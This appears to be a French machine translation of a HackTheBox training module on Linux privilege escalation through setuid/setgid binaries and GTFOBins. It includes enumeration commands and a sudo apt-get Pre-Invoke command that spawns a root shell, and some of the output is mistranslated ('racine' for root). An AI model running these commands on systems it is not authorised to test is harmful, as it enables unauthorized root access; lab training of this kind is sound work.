Autorisations spéciales
===================

* * * * *

Bit Sétuide
----------

L'autorisation `Set User ID upon Execution` (`setuid`) peut permettre à un utilisateur d'exécuter un programme ou un script avec les autorisations d'un autre utilisateur, généralement avec des privilèges élevés. Le bit `setuid` apparaît sous la forme d'un `s`.

```
dsgsec@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 racine racine 16728 1er septembre 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 racine racine 16728 1 sept. 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 racine racine 0 31 août 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 racine racine 40152 30 novembre 2017 /bin/mount
-rwsr-xr-x 1 racine racine 40128 17 mai 2017 /bin/su
-rwsr-xr-x 1 racine racine 27608 30 novembre 2017 /bin/umount
-rwsr-xr-x 1 racine racine 44680 7 mai 2014 /bin/ping6
-rwsr-xr-x 1 racine racine 30800 12 juillet 2016 /bin/fusermount
-rwsr-xr-x 1 racine racine 44168 7 mai 2014 /bin/ping
-rwsr-xr-x 1 racine racine 142032 28 janvier 2017 /bin/ntfs-3g
-rwsr-xr-x 1 racine racine 38984 14 juin 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 12 janvier 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 racine racine 14864 18 janvier 2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 racine racine 85832 30 novembre 2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 racine racine 428240 18 janvier 2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 racine racine 10232 27 mars 2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 racine racine 23376 18 janvier 2016 /usr/bin/pkexec
-rwsr-sr-x 1 racine racine 240 1 février 2016 /usr/bin/facter
-rwsr-xr-x 1 racine racine 39904 17 mai 2017 /usr/bin/newgrp
-rwsr-xr-x 1 racine racine 32944 17 mai 2017 /usr/bin/newuidmap
-rwsr-xr-x 1 racine racine 49584 17 mai 2017 /usr/bin/chfn
-rwsr-xr-x 1 racine racine 136808 4 juillet 2017 /usr/bin/sudo
-rwsr-xr-x 1 racine racine 40432 17 mai 2017 /usr/bin/chsh
-rwsr-xr-x 1 racine racine 32944 17 mai 2017 /usr/bin/newgidmap
-rwsr-xr-x 1 racine racine 75304 17 mai 2017 /usr/bin/gpasswd
-rwsr-xr-x 1 racine racine 54256 17 mai 2017 /usr/bin/passwd
-rwsr-xr-x 1 racine racine 10624 9 mai 2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 racine racine 1588768 31 août 00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 racine racine 94240 9 juin 14:54 /sbin/mount.nfs

```

Il peut être possible de désosser le programme avec le jeu de bits SETUID, d'identifier une vulnérabilité et de l'exploiter pour élever nos privilèges. De nombreux programmes ont des fonctionnalités supplémentaires qui peuvent être exploitées pour exécuter des commandes et, si le bit `setuid` est défini sur eux, celles-ci peuvent être utilisées pour notre objectif.

La permission Set-Group-ID (setgid) est une autre permission spéciale qui nous permet d'exécuter des binaires comme si nous faisions partie du groupe qui les a créés. Ces fichiers peuvent être énumérés à l'aide de la commande suivante : `find / -uid 0 -perm -6000 -type f 2>/dev/null`. Ces fichiers peuvent être exploités de la même manière que les binaires `setuid` pour augmenter les privilèges.

```
dsgsec@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 racine racine 85832 30 novembre 2017 /usr/lib/snapd/snap-confine

```

Cette [ressource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) contient plus d'informations sur les bits `setuid` et `setgid` , y compris comment définir les bits.

* * * * *

GTFOBins
--------

Le projet [GTFOBins](https://gtfobins.github.io/) est une liste organisée de fichiers binaires et de scripts pouvant être utilisés par un attaquant pour contourner les restrictions de sécurité. Chaque page détaille les fonctionnalités du programme qui peuvent être utilisées pour sortir des shells restreints, élever les privilèges, générer des connexions shell inversées et transférer des fichiers. Par exemple, `apt-get` peut être utilisé pour sortir d'environnements restreints et générer un shell en ajoutant une commande Pre-Invoke :

```
dsgsec@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# identifiant
uid=0(root) gid=0(root) groupes=0(root)

```

Cela vaut la peine de se familiariser avec autant de GTFOBins que possible pour identifier rapidement les erreurs de configuration lorsque nous atterrissons sur un système que nous devons élever nos privilèges pour aller plus loin.